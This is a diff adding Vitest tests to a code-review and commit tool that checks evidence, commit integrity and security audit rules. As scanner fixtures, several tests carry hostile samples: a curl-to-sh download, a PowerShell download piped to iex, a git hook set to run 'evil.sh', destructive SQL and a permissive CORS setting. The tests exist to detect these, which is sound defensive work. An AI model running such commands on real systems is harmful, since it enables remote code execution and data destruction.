@@ -1,6 +1,17 @@
 import { execFileSync } from "node:child_process";
-import { chmodSync, existsSync, mkdirSync, readFileSync, symlinkSync, writeFileSync } from "node:fs";
+import {
+  chmodSync,
+  existsSync,
+  mkdirSync,
+  readdirSync,
+  readFileSync,
+  rmSync,
+  symlinkSync,
+  utimesSync,
+  writeFileSync,
+} from "node:fs";
 import { rm } from "node:fs/promises";
+import os from "node:os";
 import path from "node:path";
 import { describe, expect, it } from "vitest";
 import { scanBackend } from "../src/analysis/backend.js";
@@ -13,7 +24,7 @@ import { loadConfig } from "../src/config.js";
 import { fetchSnapshot, parseSource } from "../src/repo/fetch.js";
 import { walkRepo } from "../src/repo/walk.js";
 import type { EvidenceInput, TransplantPlan } from "../src/session/schema.js";
-import { loadSession } from "../src/session/store.js";
+import { loadSession, saveSession } from "../src/session/store.js";
 import { checkUpstream } from "../src/session/upstream.js";
 import {
   assertLocalEnv,
@@ -41,8 +52,10 @@ import {
 } from "../src/session/workflow.js";
 import {
   assertGitRepo,
+  buildReviewedCommit,
   commitReviewed,
   createWorkspace,
+  landCommit,
   readTargetState,
   reviewTree,
   syncRunDirectory,
@@ -187,7 +200,9 @@ describe("evidence cannot be skipped", () => {
       recordEvidence(config, id, [
         { acceptance_criterion: "AC-3", status: "pass", kind: "screenshot", detail: "fine" },
       ]),
-    ).rejects.toThrow(/needs a manual_note/);
+    ).rejects.toThrow(/record it as manual_required/);
+    const shot = path.join(tempDir(), "shot.png");
+    writeFileSync(shot, Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]));
     const state = await recordEvidence(config, id, [
       {
         acceptance_criterion: "AC-1",
@@ -197,7 +212,13 @@ describe("evidence cannot be skipped", () => {
         log_contains: "value is one",
         detail: "t",
       },
-      { acceptance_criterion: "AC-2", status: "pass", kind: "screenshot", detail: "shot" },
+      {
+        acceptance_criterion: "AC-2",
+        status: "pass",
+        kind: "screenshot",
+        screenshot_path: shot,
+        detail: "shot",
+      },
       {
         acceptance_criterion: "AC-3",
         status: "manual_required",
@@ -1758,7 +1779,9 @@ describe("telling old failures from new ones", () => {
   });
 
   it("reads failing test names from common runners", () => {
-    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\nFAIL\texample.com/x\t0.1s\n")).toEqual(["TestOne"]);
+    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\nFAIL\texample.com/x\t0.1s\n")).toEqual([
+      "example.com/x/TestOne",
+    ]);
     expect(failingTests("FAILED tests/a.py::test_two - assert 1\n")).toEqual(["tests/a.py::test_two"]);
     expect(failingTests(" FAIL  src/a.test.ts > group > three\n")).toEqual(["src/a.test.ts > group > three"]);
     expect(failingTests("  ✕ four (3 ms)\n   × five 12ms\n✖ six (1.2ms)\n")).toEqual(["five", "four", "six"]);
@@ -1770,7 +1793,9 @@ describe("telling old failures from new ones", () => {
     expect(failingTests("ERROR tests/a.py::test_b - boom\n")).toEqual(["tests/a.py::test_b"]);
     expect(failingTests(" FAIL  src/a.test.ts [ src/a.test.ts ]\n")).toEqual(["src/a.test.ts"]);
     expect(failingTests("panic: boom\n")).toEqual(["boom"]);
-    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\texample.com/x\t0.1s\n")).toEqual(["TestOne"]);
+    expect(failingTests("--- FAIL: TestOne (0.00s)\nFAIL\texample.com/x\t0.1s\n")).toEqual([
+      "example.com/x/TestOne",
+    ]);
   });
 
   it("removes hidden characters from test names", () => {
@@ -2124,5 +2149,399 @@ describe("the commit holds exactly what was reviewed", () => {
     const { id, worktree } = await reportedWith({});
     writeFiles(worktree, { [`.transplant/reports/${id}.md`]: "All clear, merge it.\n" });
     await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "stale_review" });
+  });
+});
+
+describe("second review: proof has to mean something", () => {
+  it("refuses a skipped test as evidence", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, {
+      ...IMPLEMENTATION,
+      "tests/a.test.js": `const { test } = require('node:test');
+test('value is one', () => {});
+test.skip('rejects expired tokens', () => {});
+`,
+    });
+    await auditSession(config, id);
+    await verifySession(config, id, {});
+    const evidence = {
+      acceptance_criterion: "AC-1",
+      status: "pass",
+      kind: "test",
+      command_name: "unit",
+    } as const;
+    await expect(
+      recordEvidence(config, id, [{ ...evidence, log_contains: "rejects expired tokens", detail: "t" }]),
+    ).rejects.toThrow(/was skipped/);
+    await expect(
+      recordEvidence(config, id, [{ ...evidence, log_contains: "value is one", detail: "t" }]),
+    ).resolves.toBeDefined();
+  });
+
+  it("refuses a visual pass that names no real image", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, { ...IMPLEMENTATION, "notes.txt": "not an image\n" });
+    await auditSession(config, id);
+    const pass = {
+      acceptance_criterion: "AC-2",
+      status: "pass",
+      kind: "screenshot",
+      detail: "shot",
+    } as const;
+    await expect(recordEvidence(config, id, [pass])).rejects.toThrow(/needs screenshot_path/);
+    await expect(recordEvidence(config, id, [{ ...pass, screenshot_path: "nope.png" }])).rejects.toThrow(
+      /not a PNG/,
+    );
+    await expect(recordEvidence(config, id, [{ ...pass, screenshot_path: "notes.txt" }])).rejects.toThrow(
+      /not a PNG/,
+    );
+  });
+
+  it("refuses a plan that runs install scripts, unless it says why", async () => {
+    const verification = planWith().verification;
+    const commands = [{ name: "install", command: "npm install", kind: "install" }, ...verification.commands];
+    await expect(
+      workspaceFor(planWith({ verification: { ...verification, commands } })),
+    ).rejects.toMatchObject({ code: "invalid_plan" });
+    const { id } = await workspaceFor(
+      planWith({
+        verification: { ...verification, commands, install_scripts_reason: "sharp needs its build step." },
+      }),
+    );
+    expect(approvalSummary(await loadSession(config, id))).toContain("sharp needs its build step.");
+  });
+
+  it("lists the criteria and how each is checked at approval", async () => {
+    const { id } = await workspaceFor();
+    const summary = approvalSummary(await loadSession(config, id));
+    expect(summary).toContain("AC-2 (visual)");
+    expect(summary).toContain("AC-3 (manual)");
+  });
+
+  it("flags an added test that does not run", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, {
+      ...IMPLEMENTATION,
+      "tests/a.test.js": "const { test } = require('node:test');\ntest.skip('later', () => {});\n",
+    });
+    expect(await auditRules(id)).toContain("tests.skipped");
+  });
+
+  it.each([
+    ["DROP over two lines", "DROP\nTABLE users;\n", "database.destructive_statement"],
+    ["DELETE over two lines", "DELETE\nFROM users;\n", "database.destructive_statement"],
+    [
+      "a formatted CORS call",
+      "app.use(cors({\n  credentials: true,\n  origin: '*',\n}));\n",
+      "security.weakened_protection",
+    ],
+  ])("reads %s as one statement", async (_label, text, rule) => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, { ...IMPLEMENTATION, "src/a.js": text });
+    expect(await auditRules(id)).toContain(rule);
+  });
+
+  it("reports a dependency the plan does not say it removes", async () => {
+    const target = {
+      ...TARGET,
+      "package.json": '{"name":"t","private":true,"dependencies":{"left-pad":"1.0.0"}}',
+    };
+    const files = [...planWith().files, { path: "package.json", action: "modify", purpose: "x" }];
+    const { id, worktree } = await workspaceFor(planWith({ files }), target);
+    writeFiles(worktree, { ...IMPLEMENTATION, "package.json": '{"name":"t","private":true}\n' });
+    expect(await auditRules(id)).toContain("dependency.removed");
+
+    const dropped = planWith({ files, dependencies: { add: [], dropped: ["left-pad"] } });
+    const second = await workspaceFor(dropped, target);
+    writeFiles(second.worktree, { ...IMPLEMENTATION, "package.json": '{"name":"t","private":true}\n' });
+    expect(await auditRules(second.id)).not.toContain("dependency.removed");
+  });
+});
+
+describe("second review: commits hold up", () => {
+  async function reported() {
+    const context = await workspaceFor();
+    writeFiles(context.worktree, IMPLEMENTATION);
+    await auditSession(config, context.id);
+    await verifySession(config, context.id, {});
+    await recordEvidence(config, context.id, ALL_EVIDENCE);
+    await reportSession(config, context.id, false);
+    return context;
+  }
+
+  it("keeps bytes that are not UTF-8", async () => {
+    const legacy = Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0d, 0x0a]);
+    const repo = createRepo(TARGET);
+    writeFileSync(path.join(repo, "legacy.txt"), Buffer.from([0x63, 0x61, 0x66, 0xe9, 0x0a]));
+    gitIn(repo, "add", "-A");
+    gitIn(repo, "commit", "-q", "-m", "legacy");
+    const workspace = await createWorkspace(repo, "feature-eeeeee", gitIn(repo, "rev-parse", "HEAD").trim());
+    writeFileSync(path.join(workspace.path, "legacy.txt"), legacy);
+    writeFileSync(path.join(workspace.path, "other.txt"), legacy);
+    const review = await reviewTree(workspace);
+    expect(review.changed.map((file) => file.path)).toEqual(["other.txt"]);
+    gitIn(repo, "config", "core.autocrlf", "true");
+    const commit = await commitReviewed(repo, workspace, review, "Add", { includeRecords: true });
+    const stored = execFileSync("git", ["show", `${commit}:other.txt`], { cwd: repo });
+    expect([...stored]).toEqual([0x63, 0x61, 0x66, 0xe9, 0x0a]);
+  });
+
+  it("refuses to commit past a failed run recorded after the report", async () => {
+    const { id } = await reported();
+    const session = await loadSession(config, id);
+    const last = session.verifications.at(-1)!;
+    session.verifications.push({ ...last, status: "failed", at: new Date(Date.now() + 1000).toISOString() });
+    await saveSession(config, session);
+    await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "not_complete" });
+  });
+
+  it("claims the commit when the save after it failed", async () => {
+    const { id } = await reported();
+    const session = await loadSession(config, id);
+    const workspace = session.workspace!;
+    const review = await reviewTree(workspace);
+    const sha = await buildReviewedCommit(session.target.path, workspace, review, "Add A", {
+      includeRecords: true,
+    });
+    workspace.pendingCommit = sha;
+    await saveSession(config, session);
+    await landCommit(workspace, sha);
+    expect((await commitSession(config, id, "Add A")).workspace!.commit).toBe(sha);
+  });
+
+  it("does not claim a commit someone else put on the branch", async () => {
+    const { id, worktree } = await reported();
+    writeFiles(worktree, { "src/a.js": "exports.value = 2;\n" });
+    gitIn(worktree, "add", "-A");
+    gitIn(worktree, "commit", "-q", "-m", "by hand");
+    await expect(commitSession(config, id, "Add A")).rejects.toMatchObject({ code: "stale_review" });
+  });
+
+  it("records the commit even if the worktree's index is locked", async () => {
+    const { id } = await reported();
+    const session = await loadSession(config, id);
+    const lock = path.join(session.workspace!.adminDir!, "index.lock");
+    writeFileSync(lock, "");
+    expect((await commitSession(config, id, "Add A")).workspace!.commit).toBeTruthy();
+    rmSync(lock, { force: true });
+  });
+
+  it("refuses a report when the worktree changes while it is written", async () => {
+    const context = await workspaceFor();
+    writeFiles(context.worktree, IMPLEMENTATION);
+    await auditSession(config, context.id);
+    await verifySession(config, context.id, {});
+    await recordEvidence(config, context.id, ALL_EVIDENCE);
+    const file = path.join(context.worktree, ".transplant", "reports", `${context.id}.md`);
+    const editor = (async () => {
+      while (!existsSync(file)) await new Promise((resolve) => setTimeout(resolve, 1));
+      writeFiles(context.worktree, { "src/a.js": "exports.value = 666;\n" });
+    })();
+    await expect(reportSession(config, context.id, false)).rejects.toMatchObject({
+      code: "workspace_changed",
+    });
+    await editor;
+    expect((await loadSession(config, context.id)).report).toBeUndefined();
+  });
+
+  it("notices a git setting that runs a command", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    gitIn(worktree, "config", "gc.recentObjectsHook", "sh evil.sh");
+    expect(await auditRules(id)).toContain("repository.git_state_changed");
+  });
+
+  it("still ignores routine gc settings", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    gitIn(worktree, "config", "gc.auto", "0");
+    expect(await auditRules(id)).not.toContain("repository.git_state_changed");
+  });
+
+  it("does not read a git config planted in the shared temp folder", async () => {
+    const planted = path.join(os.tmpdir(), "rt-empty-gitconfig");
+    writeFileSync(planted, "[this is not valid git config\n");
+    try {
+      const { id, worktree } = await workspaceFor();
+      writeFiles(worktree, IMPLEMENTATION);
+      await expect(auditRules(id)).resolves.toBeDefined();
+    } finally {
+      rmSync(planted, { force: true });
+    }
+  });
+
+  it.skipIf(process.platform === "win32")("treats a link replaced by a plain file as a change", async () => {
+    const repo = createRepo(TARGET);
+    symlinkSync("src/app.js", path.join(repo, "link.js"));
+    gitIn(repo, "add", "-A");
+    gitIn(repo, "commit", "-q", "-m", "link");
+    const workspace = await createWorkspace(repo, "feature-ffffff", gitIn(repo, "rev-parse", "HEAD").trim());
+    rmSync(path.join(workspace.path, "link.js"));
+    writeFileSync(path.join(workspace.path, "link.js"), "src/app.js");
+    const review = await reviewTree(workspace);
+    expect(review.changed.map((file) => file.path)).toContain("link.js");
+  });
+
+  it("will not write a report through a link", async () => {
+    const context = await workspaceFor();
+    writeFiles(context.worktree, IMPLEMENTATION);
+    const outside = tempDir();
+    mkdirSync(path.join(context.worktree, ".transplant"), { recursive: true });
+    symlinkSync(outside, path.join(context.worktree, ".transplant", "reports"), "junction");
+    await expect(reportSession(config, context.id, true)).rejects.toMatchObject({ code: "unsafe_path" });
+    expect(readdirSync(outside)).toEqual([]);
+  });
+});
+
+describe("second review: two servers on one session", () => {
+  it("refuses to save over a newer session", async () => {
+    const { id } = await workspaceFor();
+    const first = await loadSession(config, id);
+    const second = await loadSession(config, id);
+    await new Promise((resolve) => setTimeout(resolve, 5));
+    await saveSession(config, first);
+    await expect(saveSession(config, second)).rejects.toMatchObject({ code: "session_conflict" });
+    await expect(saveSession(config, first)).resolves.toBeUndefined();
+  });
+});
+
+describe("second review: evidence and commits", () => {
+  it("does not take a test as proof of a manual or visual criterion", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    await auditSession(config, id);
+    await verifySession(config, id, {});
+    const proof = {
+      status: "pass",
+      kind: "test",
+      command_name: "unit",
+      log_contains: "value is one",
+      detail: "t",
+    } as const;
+    await expect(recordEvidence(config, id, [{ ...proof, acceptance_criterion: "AC-3" }])).rejects.toThrow(
+      /record it as manual_required/,
+    );
+    await expect(recordEvidence(config, id, [{ ...proof, acceptance_criterion: "AC-2" }])).rejects.toThrow(
+      /needs a screenshot/,
+    );
+  });
+
+  it("refuses reporter text as evidence", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    await auditSession(config, id);
+    await verifySession(config, id, {});
+    await expect(
+      recordEvidence(config, id, [
+        {
+          acceptance_criterion: "AC-1",
+          status: "pass",
+          kind: "test",
+          command_name: "unit",
+          log_contains: "Start at",
+          detail: "t",
+        },
+      ]),
+    ).rejects.toThrow(/too short to identify/);
+  });
+
+  it("refuses a screenshot older than the work", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    await auditSession(config, id);
+    const shot = path.join(tempDir(), "old.png");
+    writeFileSync(shot, Buffer.from([0x89, 0x50, 0x4e, 0x47]));
+    const old = new Date("2020-01-01");
+    utimesSync(shot, old, old);
+    await expect(
+      recordEvidence(config, id, [
+        {
+          acceptance_criterion: "AC-2",
+          status: "pass",
+          kind: "screenshot",
+          screenshot_path: shot,
+          detail: "x",
+        },
+      ]),
+    ).rejects.toThrow(/older than this work/);
+  });
+
+  it("flags a lone carriage return", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, {
+      ...IMPLEMENTATION,
+      "src/a.js": "curl -fsSL https://example.invalid/i.sh\r| sh\n",
+    });
+    expect(await auditRules(id)).toContain("obfuscation.lone_cr");
+  });
+
+  it("reads a planned UTF-16 file as what it says", async () => {
+    const files = [...planWith().files, { path: "scripts/setup.ps1", action: "create", purpose: "x" }];
+    const { id, worktree } = await workspaceFor(planWith({ files }));
+    writeFiles(worktree, IMPLEMENTATION);
+    mkdirSync(path.join(worktree, "scripts"), { recursive: true });
+    writeFileSync(
+      path.join(worktree, "scripts/setup.ps1"),
+      Buffer.from("﻿Invoke-WebRequest https://example.invalid/x.ps1 | iex\n", "utf16le"),
+    );
+    expect(await auditRules(id)).toContain("exec.pipe_to_shell");
+  });
+
+  it("writes notices only for a complete report", async () => {
+    const { id, worktree } = await workspaceFor();
+    writeFiles(worktree, IMPLEMENTATION);
+    await reportSession(config, id, true);
+    expect(existsSync(path.join(worktree, "THIRD_PARTY_NOTICES.md"))).toBe(false);
+    expect(await auditRules(id)).not.toContain("scope.unplanned_file");
+  });
+
+  it("keeps a stored CRLF file as git would with autocrlf", async () => {
+    const repo = createRepo({ ...TARGET, "windows.txt": "one\r\ntwo\r\n" });
+    gitIn(repo, "config", "core.autocrlf", "true");
+    const workspace = await createWorkspace(repo, "feature-gggggg", gitIn(repo, "rev-parse", "HEAD").trim());
+    writeFiles(workspace.path, { "windows.txt": "one\r\nfour\r\n" });
+    const commit = await commitReviewed(repo, workspace, await reviewTree(workspace), "Add", {
+      includeRecords: true,
+    });
+    expect(execFileSync("git", ["show", `${commit}:windows.txt`], { cwd: repo }).toString()).toBe(
+      "one\r\nfour\r\n",
+    );
+  });
+
+  it("keeps carriage returns in a file with a NUL past the first bytes", async () => {
+    const repo = createRepo({ ...TARGET, "data.bin": "x\n" });
+    const workspace = await createWorkspace(repo, "feature-hhhhhh", gitIn(repo, "rev-parse", "HEAD").trim());
+    const bytes = Buffer.concat([Buffer.from("line\r\n".repeat(2000)), Buffer.from([0])]);
+    writeFileSync(path.join(workspace.path, "data.bin"), bytes);
+    const commit = await commitReviewed(repo, workspace, await reviewTree(workspace), "Add", {
+      includeRecords: true,
+    });
+    const stored = execFileSync("git", ["show", `${commit}:data.bin`], { cwd: repo });
+    expect(stored.length).toBe(bytes.length);
+  });
+
+  it("claims a saved commit even if the report turned incomplete", async () => {
+    const context = await workspaceFor();
+    writeFiles(context.worktree, IMPLEMENTATION);
+    await auditSession(config, context.id);
+    await verifySession(config, context.id, {});
+    await recordEvidence(config, context.id, ALL_EVIDENCE);
+    await reportSession(config, context.id, false);
+    const session = await loadSession(config, context.id);
+    const workspace = session.workspace!;
+    const sha = await buildReviewedCommit(
+      session.target.path,
+      workspace,
+      await reviewTree(workspace),
+      "Add A",
+      {
+        includeRecords: true,
+      },
+    );
+    workspace.pendingCommit = sha;
+    session.report!.status = "incomplete";
+    await saveSession(config, session);
+    await landCommit(workspace, sha);
+    expect((await commitSession(config, context.id, "Add A")).workspace!.commit).toBe(sha);
   });
 });
